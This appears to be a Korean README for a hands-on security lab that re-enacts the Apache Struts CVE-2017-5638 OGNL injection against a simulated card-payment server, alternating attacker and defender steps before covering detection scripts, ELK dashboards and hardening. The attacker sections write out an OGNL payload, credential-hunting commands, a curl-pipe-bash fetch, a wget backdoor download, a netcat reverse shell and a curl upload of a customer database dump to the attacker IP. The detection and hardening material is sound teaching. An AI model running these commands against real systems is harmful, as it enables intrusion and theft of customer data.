# log-analysis-simulation
카드 거래 시스템 simulation
> Apache Struts RCE(CVE-2017-5638) 취약점을 기반으로 한 **카드 거래 시스템 침투 탐지 & 자동 대응** 실습 프로젝트
> 

![Ubuntu](https://img.shields.io/badge/OS-Ubuntu_22.04-E95420?style=flat-square&logo=ubuntu)
![Apache](https://img.shields.io/badge/Server-Apache2-D22128?style=flat-square&logo=apache)
![ELK](https://img.shields.io/badge/Stack-ELK-005571?style=flat-square&logo=elastic)
![License](https://img.shields.io/badge/License-MIT-green?style=flat-square)

---

## 📖 프로젝트 개요

2017년 **에퀴팩스(Equifax) 해킹 사고**는 Apache Struts의 OGNL 인젝션 취약점을 통해 1억 4,700만 명의 개인정보가 유출된 역대 최대 규모의 금융 데이터 침해 사건입니다.

이 프로젝트는 해당 공격 벡터를 **카드 거래 시스템** 환경에 재구성하여, 침투부터 탐지·대응·강화까지의 전 과정을 직접 실습했습니다.

깃을 푸시 받은 뒤, 아래 내용을 따라 실습하면 됩니다.

```
공격자(Hacker) 시점 → 수비자(Admin) 시점을 교차하며 각 단계를 이해합니다.
```

### 핵심 목표

| 목표 | 설명 |
| --- | --- |
| 🎯 취약점 이해 | CVE-2017-5638 OGNL 인젝션 원리 파악 |
| 🔍 탐지 실습 | 실시간 로그 분석으로 침투 패턴 탐지 |
| 🤖 자동화 구현 | Bash 스크립트 + Crontab 기반 무중단 모니터링 |
| 📊 시각화 | ELK Stack(Kibana)으로 공격 트래픽 대시보드 구성 |

---

## 🗺️ 목차

1. [시스템 아키텍처 & 디렉토리 구조](https://github.com/juyeonbaeck/log-analysis-simulation?tab=readme-ov-file#%EF%B8%8F-%EC%8B%9C%EC%8A%A4%ED%85%9C-%EC%95%84%ED%82%A4%ED%85%8D%EC%B2%98--%EB%94%94%EB%A0%89%ED%86%A0%EB%A6%AC-%EA%B5%AC%EC%A1%B0)
2. [시나리오 step-by-step](https://github.com/juyeonbaeck/log-analysis-simulation?tab=readme-ov-file#%EF%B8%8F-%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4-step-by-step)
    - [Phase 1: 최초 침투 (RCE)](https://github.com/juyeonbaeck/log-analysis-simulation?tab=readme-ov-file#phase-1-%EC%B5%9C%EC%B4%88-%EC%B9%A8%ED%88%AC-rce)
    - [Phase 2: 내부 탐색 & 권한 상승](https://github.com/juyeonbaeck/log-analysis-simulation?tab=readme-ov-file#phase-1-%EC%B5%9C%EC%B4%88-%EC%B9%A8%ED%88%AC-rce)
    - [Phase 3: 데이터 유출]()
3. [Real-time Detection Automation]()
4. [Data Validation & Visualization]()
5. [Remediation & Hardening]()

---

## 🏗️ 시스템 아키텍처 & 디렉토리 구조

### 전체 흐름

```
[공격자] ──HTTP 헤더 조작──▶ [Apache Struts 서버] ──RCE 실행──▶ [카드 거래 DB]
                                      │
                              로그 기록 (access.log)
                                      │
                         [monitor_attack.sh] ─── Crontab (1분 주기)
                                      │
                            attack_alerts.log
                                      │
                              [ELK Stack / Kibana]
                              실시간 시각화 대시보드
```

### 디렉토리 구조

```
/app/payment-system/
├── configs/
│   ├── db_config.yaml        # DB 접속 정보 (password, root_password 평문) — Sensitive
│   ├── server_auth.json      # API 키, JWT secret, 서비스 비밀번호 — Sensitive
│   ├── app.cfg               # 앱 설정, DB 비밀번호 평문 — Sensitive
│   └── mail.cfg              # SMTP/IMAP 비밀번호 평문 — Sensitive
│
├── logs/
│   ├── access.log            # Apache 접근 로그 (OGNL 공격 패턴 포함, 100줄) 🛡️
│   ├── attack_alerts.log     # monitor_attack.sh 자동 생성 경보 로그 🤖
│   └── security_event.json   # jq 분석용 JSON 정형 로그 🛡️
│
└── scripts/
    └── monitor_attack.sh     # 실시간 탐지 자동화 (crontab 1분 주기 실행) 🛡️

/tmp/                         # 공격자가 투하한 파일
├── leak.sql                  # mysqldump 고객 PII 덤프 (106MB) 😈
└── bd                        # 백도어 바이너리 — 리버스 쉘 연결 😈

/var/www/backup/              # 웹루트 하위 방치 파일
└── db_backup_20260318.sql    # 구버전 DB 백업 — 관리자 계정 평문 포함, 외부 접근 가능😈

~/
└── .bash_history             # 공격자 명령어 행적 (history -c 삭제 시도 포함) 😈
```

**파일 생성 주체 요약**

| 주체 | 파일 |
| --- | --- |
| 🛡️ Admin (사전 구성) | `configs/*`, `logs/access.log`, `logs/security_event.json`, `scripts/monitor_attack.sh` |
| 🤖 자동 생성 | `logs/attack_alerts.log` |
| 😈 Hacker (공격 결과) | `/tmp/leak.sql`, `/tmp/bd`, `/var/www/backup/db_backup_20260318.sql`, `.bash_history` |

---

# ⚔️ 시나리오 step-by-step

---

## Phase 1: 최초 침투 (RCE)

> **공격 원리**: Apache Struts는 Content-Type 헤더를 OGNL 표현식으로 평가합니다. 공격자는 이 헤더에 시스템 명령어를 삽입하여 서버에서 원격 코드 실행(RCE)을 유발합니다.
> 

### Apache Access Log 구조 이해

Apache 기본 `combined` 포맷:

```
%h  %l  %u  %t  "%r"  %>s  %b  "%{Referer}i"  "%{User-Agent}i"
```

| # | 컬럼 | 필드명 | 설명 | 예시 |
| --- | --- | --- | --- | --- |
| 1 | `%h` | Remote Host | 클라이언트 IP 주소 | `10.10.10.99` |
| 2 | `%l` | Ident | identd 조회 결과 (거의 항상 `-`) | `-` |
| 3 | `%u` | Auth User | 인증된 사용자 (없으면 `-`) | `admin` |
| 4 | `%t` | Time | 요청 수신 시각 | `[19/Mar/2026:09:01:23 +0900]` |
| 5 | `%r` | Request | HTTP 요청 라인 (메서드 + URI + 프로토콜) | `GET /login.action HTTP/1.1` |
| 6 | `%>s` | Status | HTTP 응답 상태 코드 | `200`, `404`, `500` |
| 7 | `%b` | Bytes | 응답 바이트 수 (없으면 `-`) | `4521` |
| 8 | `%{Referer}i` | Referer | 이전 페이지 URL | `http://target-portal.com/` |
| 9 | `%{User-Agent}i` | User-Agent | 클라이언트 브라우저/도구 | `curl/7.88.1` |

> 💡 **탐지 포인트**: 이번 공격에서 악성 페이로드는 `Content-Type` **헤더**에 삽입되어, 로그의 9번째 필드 이후 추가 컬럼으로 기록됩니다.
> 

### 실제 로그 예시 (정상 vs 공격)

<img width="1486" height="554" alt="image" src="https://github.com/user-attachments/assets/3c0fc1e9-8780-45b8-a24f-787877569339" />


```
# ✅ 정상 요청
192.168.1.10 - - [19/Mar/2026:08:51:03 +0900] "GET /index.html HTTP/1.1" 200 3142 "-" "Mozilla/5.0"

# 🚨 OGNL 인젝션 공격 — Content-Type 헤더에 java.lang.Runtime 삽입
10.10.10.99 - - [19/Mar/2026:09:01:23 +0900] "GET /login.action HTTP/1.1" 500 1832 "-" "curl/7.88.1" Content-Type: "%{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#process=@java.lang.Runtime@getRuntime().exec('whoami'))}"
```

> **응답 코드 500** = 서버가 OGNL 표현식을 평가하다 오류 발생 → **공격이 서버에 도달한 증거**
> 

### 공격 시나리오 (공격자 IP: `10.10.10.99`, 총 12회)

공격자는 처음에는 정찰 명령으로 시작해 점차 백도어 설치, 리버스 쉘 연결로 에스컬레이션합니다.

<img width="1103" height="483" alt="image" src="https://github.com/user-attachments/assets/968f97ee-6e68-4dba-8bc5-a17510dc53c4" />


| 시각 | 주입 명령어 | 공격 단계 | 의미 |
| --- | --- | --- | --- |
| 09:01:23 | `whoami` | 정찰 | 현재 실행 계정 확인 |
| 09:03:15 | `id` | 정찰 | UID/GID로 권한 수준 파악 |
| 09:05:49 | `cat /etc/passwd` | 정찰 | 시스템 계정 목록 탈취 |
| 09:07:55 | `uname -a` | 정찰 | OS 및 커널 버전 확인 |
| 09:10:02 | `ls /var/www/html` | 정찰 | 웹루트 파일 구조 파악 |
| 09:12:08 | `curl http://10.10.10.99:4444/shell.sh | bash` | 침투 | 악성 쉘 스크립트 원격 실행 |
| 09:14:29 | `wget -O /tmp/bd http://10.10.10.99/backdoor` | 침투 | 백도어 바이너리 투하 |
| 09:16:44 | `chmod +x /tmp/bd && /tmp/bd` | 침투 | 백도어 권한 부여 및 실행 |
| 09:19:03 | `nc -e /bin/bash 10.10.10.99 4444` | 지속성 | Netcat 리버스 쉘 연결 |
| 09:21:19 | `python3 -c 'import socket...'` | 지속성 | Python 리버스 쉘 (대안) |
| 09:23:39 | `crontab -l` | 지속성 | 예약 작업 확인 (지속성 검증) |
| 09:26:10 | `ps aux` | 유지 | 실행 중 프로세스 목록 확인 |

### 🛡️ Admin 탐지 명령어

```bash
# 1. 기본 탐지: ognl 또는 java.lang 패턴 검색
grep -E "ognl|java.lang" /app/payment-system/logs/access.log

# 2. 공격자 IP 기준으로 모든 요청 추출
grep "10.10.10.99" access.log

# 3. 서버 오류(500)만 필터링 — 공격이 서버에 도달한 요청
grep " 500 " access.log

# 4. 공격 횟수 카운트
grep -c "ognl" access.log

# 5. 시간대별 공격 빈도 분석
grep "10.10.10.99" access.log | awk '{print $4}' | cut -d: -f2 | sort | uniq -c
```

---

## Phase 2: Discovery & Privilege Escalation (내부 탐색)

> **공격 원리**: 초기 침투에 성공한 공격자는 서버 내부를 탐색하며 평문으로 저장된 DB 비밀번호 등 민감 정보를 수집
> 

### 😈 Hacker: 설정 파일에서 비밀번호 수집

```bash
# *.cfg, *.yaml, *.json 파일에서 password 키워드 검색
find /var/www -name "*.cfg" | xargs grep "password"
find /app -name "*.yaml" | xargs grep -i "password\|passwd\|pwd"
```

| 파일 | 경로 (실습용) | 노출된 정보 |
| --- | --- | --- |
| `app.cfg` | `/var/www/html/app.cfg` | DB 접속 비번, 세션 키 |
| `mail.cfg` | `/var/www/conf/mail.cfg` | SMTP/IMAP 비번 |
| `db_config.yaml` | `/app/payment-system/configs/db_config.yaml` | DB root/replica/FTP 비번 |
| `server_auth.json` | `/app/payment-system/configs/server_auth.json` | API 키, JWT 시크릿, 내부 서비스 비번 |
| `old_app.cfg` | `/var/www/backup/old_app.cfg` | 구버전 비번 (삭제 안 된 채 방치) |

### 🛡️ Admin: bash_history로 공격자 행적 추적

<img width="1474" height="1024" alt="image" src="https://github.com/user-attachments/assets/c950788c-ec6f-4da1-abae-6b110bf28480" />


<img width="938" height="296" alt="image" src="https://github.com/user-attachments/assets/f5ad4aa8-2821-42bb-894f-192214e4669c" />


```bash
# 최근 20줄의 명령어 기록 확인
cat ~/.bash_history | tail -n 20

# find/grep 등 의심 명령어만 필터링
grep -E "find|grep|cat /etc|passwd" ~/.bash_history
```

공격자의 전체 행적을 시간 순서대로-

| 단계 | 명령어 범위 | 행동 |
| --- | --- | --- |
| **정찰** | `whoami` ~ `ps aux` | 시스템 기본 정보 수집 |
| **탐색** | `ls /app` ~ `find ... grep` | 디렉토리 구조 파악 + 설정 파일 탐색 |
| **자격증명 수집** | `cat db_config.yaml` ~ `cat old_app.cfg` | 평문 비밀번호 직접 열람 |
| **계정 정보** | `cat /etc/passwd` ~ `grep root` | 시스템 계정 목록 수집 |
| **DB 접근** | `mysql ...` 4줄 | 탈취한 비번으로 DB 직접 조회 |
| **유출** | `mysqldump` ~ `curl POST` | 덤프 후 외부 서버 전송 |
| **지속성** | `wget bd` ~ `crontab -` | 백도어 설치 + 재부팅 후에도 실행되게 등록 |
| **증거 인멸** | `history -c` | 히스토리 삭제 시도 |

> 💡 **Admin 탐지 포인트**: 
- `history -c`로 삭제를 시도했지만, 이미 `/root/.bash_history`에 기록이 남아 있는 상태
- Admin은 `cat ~/.bash_history | tail -n 20` 또는 `grep -E "find|grep|mysqldump|curl" ~/.bash_history`로 추적 가능
> 

---

## Phase 3: 데이터 유출

> **공격 원리**:
- 탈취한 DB 계정으로 전체 고객 PII 데이터를 덤프하여 외부로 전송
- 에퀴팩스 사건에서는 이 방식으로 SSN·주소·카드 정보가 대량 유출되었음.
> 

### 😈 Hacker: mysqldump로 고객 정보 추출

```bash
# 탈취한 계정 정보로 DB 전체 덤프
mysqldump -u db_admin -p'CardAdmin123!' Customer_PII > /tmp/leak.sql

# 외부 서버로 전송 (scp 또는 curl)
curl -X POST -F "file=@/tmp/leak.sql" http://10.10.10.99:8080/upload
```

### 🛡️ Admin: 비정상적인 대용량 파일 및 네트워크 트래픽 탐지

```bash
# 비정상적으로 큰 파일 탐지 (100MB 이상)
find /tmp /var/www -size +100M -ls

# 최근 생성된 .sql 파일 탐지
find / -name "*.sql" -newer /var/log/apache2/access.log 2>/dev/null

# 외부 연결 세션 확인
ss -tunp | grep ESTABLISHED
```

---

# 🤖 실시간 침입 감지 자동화

### 1. 모니터링 스크립트 (`monitor_attack.sh`)

1분마다 로그를 스캔하여 이상 징후를 자동 기록

```bash
#!/bin/bash
# ============================================================
# monitor_attack.sh — Apache Struts RCE 실시간 탐지 스크립트
# ============================================================

LOG_PATH="/app/payment-system/logs/access.log"
ALERT_FILE="/app/payment-system/logs/attack_alerts.log"
TIMESTAMP=$(date '+%Y-%m-%d %H:%M:%S')

# 1. OGNL/java.lang 패턴 탐지 (Struts RCE 공격)
OGNL_HIT=$(grep -icE "java.lang|ognl" "$LOG_PATH")
if [ "$OGNL_HIT" -gt 0 ]; then
    echo "[$TIMESTAMP] [CRITICAL] OGNL 인젝션 탐지: ${OGNL_HIT}건" >> "$ALERT_FILE"
    grep -iE "java.lang|ognl" "$LOG_PATH" >> "$ALERT_FILE"
fi

# 2. 대용량 응답 탐지 (10MB 이상 — 데이터 유출 가능성)
awk -v ts="$TIMESTAMP" '$10 > 10485760 {
    print "[" ts "] [WARNING] Large Response: " $0
}' "$LOG_PATH" >> "$ALERT_FILE"

# 3. 동일 IP 500 에러 다수 발생 탐지 (5회 이상)
awk '$9 == 500 {print $1}' "$LOG_PATH" | sort | uniq -c | awk -v ts="$TIMESTAMP" '$1 >= 5 {
    print "[" ts "] [WARNING] 500 Error Spike from IP: " $2 " (" $1 "회)"
}' >> "$ALERT_FILE"

# 4. 알림 출력
if [ -s "$ALERT_FILE" ]; then
    echo "[$TIMESTAMP] ALERT: 보안 이벤트가 탐지되었습니다. $ALERT_FILE 확인 요망."
fi
```

### 2. Crontab 자동 스케줄링

```bash
# crontab 등록 (1분 주기 실행)
crontab -e

# 추가할 내용:
* * * * * /bin/bash /app/payment-system/scripts/monitor_attack.sh >> /var/log/monitor.log 2>&1
```

| 필드 | 값 | 의미 |
| --- | --- | --- |
| 분 | `*` | 매 분 |
| 시 | `*` | 매 시간 |
| 일 | `*` | 매일 |
| 월 | `*` | 매월 |
| 요일 | `*` | 매 요일 |

---

# 📊 데이터 검증 & 시각화

## 1. `jq`로 JSON 로그 검증

`security_event.json`에서 CRITICAL 등급 이벤트만 추출

```bash
# CRITICAL 이벤트의 시각 + 공격자 IP만 추출
cat security_event.json | jq '.[] | select(.event_type == "CRITICAL") | {time: .timestamp, ip: .src_ip}'

# 공격자 IP별 이벤트 건수 집계
cat security_event.json | jq '[.[] | .src_ip] | group_by(.) | map({ip: .[0], count: length}) | sort_by(-.count)'
```

**출력 예시:**

```json
{
  "time": "2026-03-19T09:01:23+09:00",
  "ip": "10.10.10.99"
}
```

## 2. ELK Stack (Kibana) 시각화

### Kibana 설정

| 항목 | 값 |
| --- | --- |
| Index Pattern | `apache-access-*` |
| Time Field | `@timestamp` |
| KQL Query | `message: "%{" AND status: >=500` |

### 주요 시각화 항목

```
[Kibana Dashboard 구성]

┌─────────────────────────────────────────────────────────────┐
│  Time Series: 시간대별 HTTP 500 에러 발생 빈도              │
│  → 09:01 ~ 09:26 사이 스파이크(Spike) 구간 확인             │
├─────────────────────────────────────────────────────────────┤
│  Pie Chart: 상태 코드 분포 (200 / 302 / 401 / 500)          │
├─────────────────────────────────────────────────────────────┤
│  Data Table: 상위 공격 IP + 요청 횟수                       │
│  → 10.10.10.99: 12건 (전체 500 에러의 100%)                 │
└─────────────────────────────────────────────────────────────┘
```

---

## 🛡️ Remediation & Hardening

사고 재발 방지를 위한 보안 강화 조치입니다.

### 1. 소프트웨어 업데이트

```bash
# Apache2 및 관련 패키지 최신 보안 패치 적용
apt-get update && apt-get upgrade apache2 -y

# Apache Struts 버전 확인 (취약 버전: 2.3.5 ~ 2.3.31, 2.5 ~ 2.5.10)
find / -name "struts*.jar" 2>/dev/null
```

### 2. 파일 권한 강화

```bash
# 민감 설정 파일 접근 권한을 소유자만으로 제한
chmod 600 /app/payment-system/configs/db_config.yaml
chmod 600 /app/payment-system/configs/server_auth.json

# 소유자 확인
ls -la /app/payment-system/configs/
```

### 3. 자격증명 관리 고도화

```bash
# 평문 비밀번호 제거 후 AWS Secrets Manager로 교체
# 기존 (❌ 위험)
db_password: "CardAdmin123!"

# 개선 (✅ 안전) — AWS CLI로 런타임에 조회
DB_PASS=$(aws secretsmanager get-secret-value \
  --secret-id prod/payment/db \
  --query SecretString \
  --output text | jq -r '.password')
```

### 4. WAF 룰 추가 (Apache mod_security)

```
# /etc/modsecurity/modsecurity.conf 에 추가
SecRule REQUEST_HEADERS:Content-Type "@rx ognl|java\.lang" \
    "id:10001,phase:1,deny,status:403,msg:'Struts RCE Attempt Blocked'"
```

### 보안 강화 체크리스트

- [ ]  Apache Struts 최신 버전 업그레이드
- [ ]  Content-Type 헤더 WAF 필터링 적용
- [ ]  민감 파일 권한 `600` 설정
- [ ]  DB 계정 평문 비밀번호 → AWS Secrets Manager 전환
- [ ]  `monitor_attack.sh` Crontab 등록 완료
- [ ]  ELK 대시보드 알림(Alert) 임계값 설정

---

## 🔗 참고 자료

- [CVE-2017-5638 공식 NVD 상세](https://nvd.nist.gov/vuln/detail/CVE-2017-5638)
- [Apache Struts 보안 권고](https://struts.apache.org/security/)
- [Equifax Breach FTC 보고서](https://www.ftc.gov/enforcement/cases-proceedings/refunds/equifax-data-breach-settlement)
- [ELK Stack 공식 문서](https://www.elastic.co/guide/index.html)

---
